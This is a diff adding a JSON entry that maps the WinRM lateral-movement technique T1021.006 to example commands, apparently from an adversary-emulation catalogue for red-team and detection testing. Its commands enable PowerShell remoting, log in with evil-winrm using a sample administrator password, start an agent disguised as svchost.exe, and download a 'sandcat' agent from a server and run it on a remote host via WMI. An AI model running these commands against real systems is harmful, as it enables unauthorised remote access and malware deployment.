@@ -1,0 +1,26 @@
+   "T1021.006": {
+      "technique_name": "Remote Services: Windows Remote Management",
+      "tactic": "lateral-movement",
+      "known implementations": [
+         {
+            "description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n",
+            "command": "Enable-PSRemoting -Force"
+         },
+         {
+            "description": "An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled",
+            "command": "evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1"
+         },
+         {
+            "description": "Simulate lateral movement with PowerShell Remoting on the local host. \nUpon successful execution, PowerShell will execute `whoami` using `Invoke-Command`, targeting the \nlocal machine as remote target.\n",
+            "command": "Enable-PSRemoting -Force; Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}"
+         },
+         {
+            "description": "Start Agent using WinRM (WinRM)",
+            "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} }};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n"
+         },
+         {
+            "description": "Copy Sandcat file using PowerShell",
+            "command": "$server=\"#{server}\";\n$sharePath=\"#{share}\";\nSet-Location $sharePath;$url=\"$($server)/file/download\";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))\n-and ([io.file]::WriteAllBytes(\"$($sharePath)$name.exe\",$data));\n$startServer=\"$($sharePath)$name.exe -server $($server) \";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList \"$($sharePath)$name.exe\n-server $server -v\" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server\n"
+         }
+      ]
+   },
